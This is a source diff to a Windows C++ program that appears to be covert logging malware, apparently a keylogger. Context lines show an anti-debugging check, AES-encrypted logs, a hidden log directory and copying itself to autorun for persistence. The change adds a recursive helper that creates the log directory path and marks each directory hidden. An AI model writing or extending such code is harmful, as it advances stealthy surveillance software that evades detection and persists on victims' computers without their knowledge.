@@ -64,6 +64,7 @@ void checkDebugging();
 vector<unsigned char> hexToBytes(const string& hex);
 inline char hexDigit(unsigned a);
 string bytesToHex(unsigned char* data, int length);
+void createDirectoryRecursively(tstring path);
 
 //Main
 int APIENTRY _tWinMain(HINSTANCE This, HINSTANCE Prev, LPTSTR cmd, int mode)
@@ -78,8 +79,7 @@ int APIENTRY _tWinMain(HINSTANCE This, HINSTANCE Prev, LPTSTR cmd, int mode)
 		key = hexToBytes(aesKey);
 
 	//Create directory for log
-	CreateDirectory(dirPath.c_str(), NULL);
-	SetFileAttributes(dirPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
+	createDirectoryRecursively(dirPath);
 
 	//Copy to autorun
 	if (copyToAutorun) {
@@ -263,4 +263,22 @@ string bytesToHex(unsigned char * data, int length)
 		r[i * 2 + 1] = hexDigit(data[i] & 15);
 	}
 	return r;
+}
+
+void createDirectoryRecursively(tstring path)
+{
+	BOOL directoryCreated = CreateDirectory(path.c_str(), NULL);
+	if (!directoryCreated)
+	{
+		if (GetLastError() == ERROR_PATH_NOT_FOUND)
+		{
+			size_t newSize = path.find_last_of(_T('\\'));
+			if (newSize == tstring::npos)
+				abort();
+			tstring newPath(path.begin(), path.begin() + newSize);
+			createDirectoryRecursively(newPath);
+			CreateDirectory(path.c_str(), NULL);
+		}
+	}
+	SetFileAttributes(path.c_str(), FILE_ATTRIBUTE_HIDDEN);
 }
